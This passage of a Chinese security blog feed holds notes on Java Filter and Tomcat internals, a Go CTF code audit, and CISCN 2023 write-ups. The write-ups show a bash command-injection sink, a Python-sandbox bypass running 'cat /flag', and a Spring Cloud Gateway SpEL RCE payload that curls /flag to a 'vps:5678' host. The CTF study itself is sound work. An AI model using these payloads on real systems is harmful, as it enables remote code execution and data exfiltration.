href="#基本工作原理">#</a> 基本工作原理</h4><blockquote><p>1、Filter 程序是一个实现了特殊接口的 Java 类，与 Servlet 类似，也是由 Servlet 容器进行调用和执行的。</p><p>2、当在 web.xml 注册了一个 Filter 来对某个 Servlet 程序进行拦截处理时，它可以决定是否将请求继续传递给 Servlet 程序，以及对请求和响应消息是否进行修改。</p><p>3、当 Servlet 容器开始调用某个 Servlet 程序时，如果发现已经注册了一个 Filter 程序来对该 Servlet 进行拦截，那么容器不再直接调用 Servlet 的 service 方法，而是调用 Filter 的 doFilter 方法，再由 doFilter 方法决定是否去激活 service 方法。</p><p>4、但在 Filter.doFilter 方法中不能直接调用 Servlet 的 service 方法，而是调用 FilterChain.doFilter 方法来激活目标 Servlet 的 service 方法，FilterChain 对象时通过 Filter.doFilter 方法的参数传递进来的。</p><p>5、只要在 Filter.doFilter 方法中调用 FilterChain.doFilter 方法的语句前后增加某些程序代码，这样就可以在 Servlet 进行响应前后实现某些特殊功能。</p><p>6、如果在 Filter.doFilter 方法中没有调用 FilterChain.doFilter 方法，则目标 Servlet 的 service 方法不会被执行，这样通过 Filter 就可以阻止某些非法的访问请求。</p></blockquote><p>也就是说</p><p>Filter 中的 Filter 访问需要在 web.xml 里面定义路径</p><p>Filter 有一条 FilterChain，也就是由多个 Filter 组成的，会进行一个个的 Filter 操作，最后一个 Filter 最后会执行 Servlet.service ()</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230809100404774.png" alt="image-20230809100404774"></p><h4 id="生命周期-2"><a class="markdownIt-Anchor" href="#生命周期-2">#</a> 生命周期</h4><blockquote><p>与 servlet 一样，Filter 的创建和销毁也由 Web 容器负责。Web 应用程序启动时，Web 服务器将创建 Filter 的实例对象，并调用其 init () 方法，读取 web.xml 配置，完成对象的初始化功能，从而为后续的用户请求作好拦截的准备工作（filter 对象只会创建一次，init 方法也只会执行一次）。开发人员通过 init 方法的参数，可获得代表当前 filter 配置信息的 FilterConfig 对象。 Filter 对象创建后会驻留在内存，当 Web 应用移除或服务器停止时才销毁。在 Web 容器卸载 Filter 对象之前被调用。该方法在 Filter 的生命周期中仅执行一次。在这个方法中，可以释放过滤器使用的资源。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterTest</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;  </span><br><span class="line">        <span class="comment">// 在这里面进行 doGet 和 doPost 这种类似的  </span></span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="filter链"><a class="markdownIt-Anchor" href="#filter链">#</a> Filter 链</h4><blockquote><p>当多个 Filter 同时存在的时候，组成了 Filter 链。Web 服务器根据 Filter 在 web.xml 文件中的注册顺序，决定先调用哪个 Filter。当第一个 Filter 的 doFilter 方法被调用时，web 服务器会创建一个代表 Filter 链的 FilterChain 对象传递给该方法，通过判断 FilterChain 中是否还有 Filter 决定后面是否还调用 Filter。</p></blockquote><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/FilterChain.png" alt="img"></p><h3 id="listener"><a class="markdownIt-Anchor" href="#listener">#</a> Listener</h3><h4 id="概念-3"><a class="markdownIt-Anchor" href="#概念-3">#</a> 概念</h4><blockquote><p>Java Web 开发中的监听器（Listener）就是 Application、Session 和 Request 三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。</p><p>ServletContextListener：对 Servlet 上下文的创建和销毁进行监听； ServletContextAttributeListener：监听 Servlet 上下文属性的添加、删除和替换；</p><p>HttpSessionListener：对 Session 的创建和销毁进行监听。Session 的销毁有两种情况，一个中 Session 超时，还有一种是通过调用 Session 对象的 invalidate () 方法使 session 失效。</p><p>HttpSessionAttributeListener：对 Session 对象中属性的添加、删除和替换进行监听；ServletRequestListener：对请求对象的初始化和销毁进行监听； ServletRequestAttributeListener：对请求对象属性的添加、删除和替换进行监听。</p></blockquote><h2 id="0x03-tomcat基础介绍"><a class="markdownIt-Anchor" href="#0x03-tomcat基础介绍">#</a> 0x03 Tomcat 基础介绍</h2><blockquote><p>Apache 是 Web 服务器（静态解析，如 HTML），Tomcat 是 java 应用服务器（动态解析，如 JSP）</p><p>Tomcat 只是一个 servlet (jsp 也翻译成 servlet) 容器，可以认为是 Apache 的扩展，但是可以独立于 Apache 运行。</p></blockquote><h2 id="0x04-tomcat架构"><a class="markdownIt-Anchor" href="#0x04-tomcat架构">#</a> 0x04 Tomcat 架构</h2><p>主要有 server、service、connector、container 四个部分</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/TomcatStage.png" alt="img"></p><p>图中可以看出 Tomcat 的心脏是两个组件：Connector 和 Container：<br>Connector 主要负责对外交流，进行 Socket 通信 (基于 TCP/IP)，解析 HTTP 报文，对应下图中的 http 服务器；</p><p>Container 主要处理 Connector 接受的请求，主要是处理内部事务，加载和管理 Servlet，由 Servlet 具体负责处理 Request 请求，对应下图中的 servlet 容器。</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/TomcatUse.png" alt="img"></p><h4 id="server"><a class="markdownIt-Anchor" href="#server">#</a> Server</h4><blockquote><p>即服务器，代表整个 Tomcat 服务器，它要能够提供一个接口让其它程序能够访问到这个 Service 集合、同时要维护它所包含的所有 Service 的生命周期，包括如何初始化、如何结束服务、如何找到别人要访问的 Service。还有其它的一些次要的任务</p></blockquote><h4 id="service"><a class="markdownIt-Anchor" href="#service">#</a> Service</h4><blockquote><p>Service 主要是为了关联 Connector 和 Container，同时会初始化它下面的其它组件，在 Connector 和 Container 外面多包一层，把它们组装在一起，向外面提供服务，一个 Service 可以设置多个 Connector，但是只能有一个 Container 容器。</p><p>Tomcat 中 Service 接口的标准实现类是 StandardService ，它不仅实现了 Service 借口同时还实现了 Lifecycle 接口，这样它就可以控制它下面的组件的生命周期了</p></blockquote><h4 id="connecter"><a class="markdownIt-Anchor" href="#connecter">#</a> Connecter</h4><blockquote><p>Connector 组件是 Tomcat 中两个核心组件之一，它的主要任务是负责接收浏览器的发过来的 tcp 连接请求，创建一个 Request 和 Response 对象分别用于和请求端交换数据，然后会产生一个线程来处理这个请求并把产生的 Request 和 Response 对象传给处理这个请求的线程，处理这个请求的线程就是 Container 组件要做的事了。</p></blockquote><blockquote><p>socket 通信<br>解析处理应用层协议，如将 socket 连接封装成 request 和 response 对象，后续交给 Container 来处理<br>将 Request 转换为 ServletRequest，将 Response 转换为 ServletResponse</p></blockquote><p>其中 Tomcat 设计了三个组件，其负责功能如下：</p><ul><li>EndPoint: 负责网络通信，将字节流传递给 Processor；</li><li>Processor: 负责处理字节流生成 Tomcat Request 对象，将 Tomcat Request 对象传递给 Adapter；</li><li>Adapter: 负责将 Tomcat Request 对象转化成 ServletRequest 对象，传递给容器。</li></ul><h4 id="adapter组件"><a class="markdownIt-Anchor" href="#adapter组件">#</a> Adapter 组件</h4><blockquote><p>由于协议的不同，Tomcat 定义了自己的 Request 类来存放请求信息，但是这个不是标准的 ServletRequest。于是需要使用 Adapter 将 Tomcat Request 对象转成 ServletRequest 对象，然后就能调用容器的 service 方法。</p><p>简而言之，Endpoint 接收到 Socket 连接后，生成一个 SocketProcessor 任务提交到线程池进行处理，SocketProcessor 的 run 方法将调用 Processor 组件进行应用层协议的解析，Processor 解析后生成 Tomcat Request 对象，然后会调用 Adapter 的 Service 方法，方法内部通过如下代码将 Request 请求传递到容器中。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connector.getService().getContainer().getPipeline().getFirst().invoke(request, response);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/TomcatConnector.png" alt="img"></p><h4 id="container"><a class="markdownIt-Anchor" href="#container">#</a> Container</h4><blockquote><p>Container（又名 Catalina）用于处理 Connector 发过来的 servlet 连接请求，它是容器的父接口，所有子容器都必须实现这个接口，Container 容器的设计用的是典型的责任链的设计模式，它有四个子容器组件构成，分别是：Engine、Host、Context、Wrapper，这四个组件不是平行的，而是父子关系，Engine 包含 Host，Host 包含 Context，Context 包含 Wrapper。</p></blockquote><blockquote><ul><li>Engine: 最顶层容器组件，可以包含多个 Host。实现类为  <code>org.apache.catalina.core.StandardEngine</code></li><li>Host: 代表一个虚拟主机，每个虚拟主机和某个域名 Domain Name 相匹配，可以包含多个 Context。实现类为  <code>org.apache.catalina.core.StandardHost</code></li><li>Context: 一个 Context 对应于一个 Web 应用，可以包含多个 Wrapper。实现类为  <code>org.apache.catalina.core.StandardContext</code></li><li>Wrapper: 一个 Wrapper 对应一个 Servlet。负责管理 Servlet ，包括 Servlet 的装载、初始化、执行以及资源回收。实现类为  <code>org.apache.catalina.core.StandardWrapper</code></li></ul></blockquote><p>看下面这个图可能会更直观一些</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/tomcat3.png" alt="img"></p><p>通常一个 Servlet class 对应一个 Wrapper，如果有多个 Servlet 就可以定义多个 Wrapper，如果有多个 Wrapper 就要定义一个更高的 Container。</p><p>举个🌰，a.com 和 b.com 分别对应着两个 Host</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/TomcatContainer.png" alt="img"></p><p>每一个 Context 都有唯一的 path。这里的 path 不是指 servlet 绑定的 WebServlet 地址，而是指独立的一个 Web 应用地址。就好比 Tomat 默认的 / 地址和 /manager 地址就是两个不同的 web 应用，所以对应两个不同的 Context。要添加 Context 需要在 server.xml 中配置 docbase。</p><h2 id="0x05-tomcat的类加载机制"><a class="markdownIt-Anchor" href="#0x05-tomcat的类加载机制">#</a> 0x05 Tomcat 的类加载机制</h2><blockquote><p>由于 Tomcat 中有多个 WebApp 同时要确保之间相互隔离，所以 Tomcat 的类加载机制也不是传统的双亲委派机制。</p><p>Tomcat 自定义的类加载器 WebAppClassloader 为了确保隔离多个 WebApp 之间相互隔离，所以打破了双亲委托机制。每个 WebApp 用一个独有的 ClassLoader 实例来优先处理加载。它首先尝试自己加载某个类，如果找不到再交给父类加载器，其目的是优先加载 WEB 应用自己定义的类。</p><p>同时为了防止 WEB 应用自己的类覆盖 JRE 的核心类，在本地 WEB 应用目录下查找之前，先使用 ExtClassLoader（使用双亲委托机制）去加载，这样既打破了双亲委托，同时也能安全加载类。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x01-前言&quot;&gt;#&lt;/a&gt; 0x01 前言&lt;/h2&gt;
&lt;p&gt;熟悉一下 Tomcat 框架&lt;/p&gt;
&lt;h2 id=&quot;0x02-java-web-三大</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Java安全" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="内存马" scheme="https://ki10moc.github.io/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>Funny_go</title>
    <link href="https://ki10moc.github.io/2023/07/23/funny_go1/"/>
    <id>https://ki10moc.github.io/2023/07/23/funny_go1/</id>
    <published>2023-07-22T20:20:36.000Z</published>
    <updated>2023-07-28T05:33:21.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/s/1nLaI1aZpA-IFkInIfKJrCw?pwd=z3q9">源码自行下载</a></p><p>回过头再看一下代码</p><p>有用的地方就是 <code>SubmitMoveHandler</code></p><p>直接去 move 打</p><p>其他都是废话</p><p>gorm 和 gin 框架</p><p>5 个路由</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">router.GET(<span class="string">&quot;/user&quot;</span>, UserHandler)<span class="comment">//用户登录信息</span></span><br><span class="line">router.POST(<span class="string">&quot;/login&quot;</span>, LoginHandler)<span class="comment">//对比数据库用户信息登录</span></span><br><span class="line">router.POST(<span class="string">&quot;/upload&quot;</span>, cookieCheckMiddleware(), UploadHandler) <span class="comment">//文件上传(需登录)</span></span><br><span class="line">router.POST(<span class="string">&quot;/move&quot;</span>, IpSecurityCheck(), SubmitMoveHandler)<span class="comment">//移动文件(判断IP)</span></span><br><span class="line">router.POST(<span class="string">&quot;/download&quot;</span>, cookieCheckMiddleware(), DownloadHandler)<span class="comment">//下载文件(需登录)</span></span><br></pre></td></tr></table></figure><p>首先从代码上两个比较明显的点</p><p>1、IpSecurityCheck</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IpSecurityCheck</span><span class="params">()</span></span> gin.HandlerFunc &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> c.Request.RemoteAddr[:<span class="number">9</span>] != <span class="string">&quot;127.0.0.1&quot;</span> &amp;&amp; c.Request.RemoteAddr[:<span class="number">9</span>] != <span class="string">&quot;localhost&quot;</span> &#123;</span><br><span class="line">c.JSON(<span class="number">403</span>, gin.H&#123;<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;No you&#x27;are not allowed&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.Next()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、SubmitMoveHandler</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SubmitMoveHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> filename Filename</span><br><span class="line"><span class="keyword">if</span> err := c.ShouldBindJSON(&amp;filename); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusBadRequest, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cmd := exec.Command(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;mv ./upload/pdf/&quot;</span>+filename.Filename+<span class="string">&quot; ./assert/pdf/&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err := cmd.Run(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;message&quot;</span>: filename.Filename&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显的 SSRF 和命令注入</p><p>那么再来看下前置步骤</p><p>首先是 struct 进行查询时，gorm 只会查询非零字段，若值为 0，false，’' 或其他零值</p><p>gorm 会忽略 where 条件</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230723033803704.png" alt="image-20230723033803704"></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230723033823276.png" alt="image-20230723033823276"></p><p>得到 username 和 password</p><p>进行登录</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230723033947090.png" alt="image-20230723033947090"></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230723040521720.png" alt="image-20230723040521720"></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230723034517349.png" alt="image-20230723034517349"></p><p>--------------------------9a28df6f0f9a180f Content-Disposition: form-data; name=“xx”; filename=“flag” Content-Type: application/octet-stream flag{ki10Moc_W0nt_31eep} --------------------------9a28df6f0f9a180f–</p><p>但其实这题代码写的有问题</p><p>5 个路由只需要 move 即可</p><p>因为 move 没有身份验证</p><p>可以直接打</p><p>单纯的命令注入</p><p>突然看到有命令执行！</p><p>攻击队上班了？</p><p>乐，复现题目被态势感知记录了</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230723012127208.png" alt="image-20230723012127208"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://pan.baidu.com/s/1nLaI1aZpA-IFkInIfKJrCw?pwd=z3q9&quot;&gt;源码自行下载&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;回过头再看一下代码&lt;/p&gt;
&lt;p&gt;有用的地方就是 &lt;code&gt;SubmitMoveHandler&lt;/co</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Go" scheme="https://ki10moc.github.io/tags/Go/"/>
    
    <category term="Gin" scheme="https://ki10moc.github.io/tags/Gin/"/>
    
    <category term="Gorm" scheme="https://ki10moc.github.io/tags/Gorm/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2023</title>
    <link href="https://ki10moc.github.io/2023/05/28/CISCN_2023/"/>
    <id>https://ki10moc.github.io/2023/05/28/CISCN_2023/</id>
    <published>2023-05-28T15:41:08.000Z</published>
    <updated>2023-05-28T16:40:17.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="unzip"><a class="markdownIt-Anchor" href="#unzip">#</a> unzip</h2><p>软链接  通过 var/www/html 包含马</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305290005545.png" alt="image-20230529000548874"></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305290006532.png" alt="image-20230529000609504"></p><p>并通过 var 目录将马放入</p><p>依次上传</p><p>读取 flag</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305290006488.png" alt="image-20230529000624465"></p><p 7349cbbd-20da-4b3e-8bd9-36084dac7053="">flag</p><h2 id="pyshell"><a class="markdownIt-Anchor" href="#pyshell">#</a> pyshell</h2><p>Python 的 shell</p><p>导入 os 库查看 flag</p><p>但是被 ban 了</p><p>发现 open 和 eval 还在</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305290006386.png" alt="image-20230529000654365"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">但是还ban</span><br><span class="line">猜测可能是对长度有限制</span><br><span class="line"></span><br><span class="line">Welcome to this python shell,<span class="keyword">try</span> to find the flag!</span><br><span class="line">&gt;&gt;<span class="string">&#x27;__imp&#x27;</span></span><br><span class="line"><span class="string">&#x27;__imp&#x27;</span></span><br><span class="line">&gt;&gt;_+<span class="string">&#x27;ort&#x27;</span></span><br><span class="line"><span class="string">&#x27;__import&#x27;</span></span><br><span class="line">&gt;&gt;_+<span class="string">&#x27;__(&#x27;</span></span><br><span class="line"><span class="string">&#x27;__import__(&#x27;</span></span><br><span class="line">&gt;&gt;_+<span class="string">&quot;&#x27;os&quot;</span></span><br><span class="line"><span class="string">&quot;__import__(&#x27;os&quot;</span></span><br><span class="line">&gt;&gt;v</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;v&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line">&gt;&gt;_+<span class="string">&quot;&#x27;).&quot;</span></span><br><span class="line"><span class="string">&quot;__import__(&#x27;os&#x27;).&quot;</span></span><br><span class="line">&gt;&gt;_+<span class="string">&quot;sys&quot;</span></span><br><span class="line"><span class="string">&quot;__import__(&#x27;os&#x27;).sys&quot;</span></span><br><span class="line">&gt;&gt;_+<span class="string">&quot;tem&quot;</span></span><br><span class="line"><span class="string">&quot;__import__(&#x27;os&#x27;).system&quot;</span></span><br><span class="line">&gt;&gt;_+<span class="string">&quot;(&#x27;c&quot;</span></span><br><span class="line"><span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;c&quot;</span></span><br><span class="line">&gt;&gt;_+<span class="string">&quot;at &quot;</span></span><br><span class="line"><span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat &quot;</span></span><br><span class="line">&gt;&gt;_+<span class="string">&quot;/fl&quot;</span></span><br><span class="line"><span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /fl&quot;</span></span><br><span class="line">&gt;&gt;_+<span class="string">&quot;ag&#x27;&quot;</span></span><br><span class="line"><span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /flag&#x27;&quot;</span></span><br><span class="line">&gt;&gt;_+<span class="string">&quot;)&quot;</span></span><br><span class="line"><span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /flag&#x27;)&quot;</span></span><br><span class="line">&gt;&gt;<span class="built_in">eval</span>(_)</span><br><span class="line">flag&#123;5dd8032d-4dbf-40c2-9ef9-c86386511c7a&#125;<span class="number">0</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305290007550.png" alt="image-20230529000712501"></p><p 5dd8032d-4dbf-40c2-9ef9-c86386511c7a="">flag</p><h2 id="backendservice"><a class="markdownIt-Anchor" href="#backendservice">#</a> BackendService</h2><p>登录框</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305290007016.png" alt="image-20230529000730982"></p><p>尝试爆破无果</p><p>查找默认密码也不行</p><p>未授权绕过</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305290007581.png" alt="image-20230529000739556"></p><p>aa/aa</p><p>进行登录</p><p>新建配置</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305290007013.png" alt="image-20230529000750982"></p><p>题目外网 IP 和内网的端口</p><p>监听到内网机器</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305290007913.png" alt="image-20230529000758891"></p><p>根据文章</p><p><a href="#toc-3">Nacos 结合 Spring Cloud Gateway RCE 利用 - 先知社区 (aliyun.com)</a></p><p>写 poc</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;spring&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;cloud&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;gateway&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;routes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;exam&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;order&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lb://service-provider&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;predicates&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                            <span class="string">&quot;Path=/echo/**&quot;</span></span><br><span class="line">                        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;filters&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                            <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AddResponseHeader&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;result&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                    <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;curl&#x27;,&#x27;vps:5678&#x27;,&#x27;-d&#x27;,&#x27;@/flag&#x27;&#125;).getInputStream())).replaceAll(&#x27;\\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\\r&#x27;,&#x27;&#x27;)&#125;&quot;</span></span><br><span class="line">                                <span class="punctuation">&#125;</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">]</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">]</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305290008663.png" alt="image-20230529000829618"></p><p e1667a09-38d6-4eb8-b38d-20de0f9269a4="">flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;unzip&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#unzip&quot;&gt;#&lt;/a&gt; unzip&lt;/h2&gt;
&lt;p&gt;软链接  通过 var/www/html 包含马&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubus</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://ki10moc.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Springboot-Spel表达式注入</title>
    <link href="https://ki10moc.github.io/2023/05/04/Springboot-Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"/>
    <id>https://ki10moc.github.io/2023/05/04/Springboot-Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</id>
    <published>2023-05-04T03:35:36.000Z</published>
    <updated>2023-05-25T08:53:00.000Z</updated>
    
